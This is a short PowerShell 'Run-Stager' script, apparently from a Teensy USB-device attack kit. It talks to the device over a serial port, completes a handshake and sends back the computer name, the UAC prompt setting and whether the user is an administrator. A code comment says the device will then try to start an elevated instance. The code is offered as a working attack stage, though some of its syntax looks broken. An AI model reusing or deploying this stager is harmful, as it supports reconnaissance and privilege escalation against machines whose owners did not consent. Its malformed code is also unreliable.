function Run-Stager {
[ps]::[sploit]::init()
[ps]::[sploit]::Write("init")
$resp=[ps]::[sploit]::Read()
if (-Not $resp -eq "ack") {return}
[ps]::[sploit]::Write($env:computername)
$uac=Get-RegistryValue HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System ConsentPromptBehaviorAdmin
Write-Host $uac
$admin=([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] “Administrator”)
[ps]::[sploit]::Write($admin)
if (-Not $admin) { #teensy will attempt to create elevated instance if not already
  $port.close() #let go of port
  return #in case I decide to add more data return later
}
} Run-Stager

x
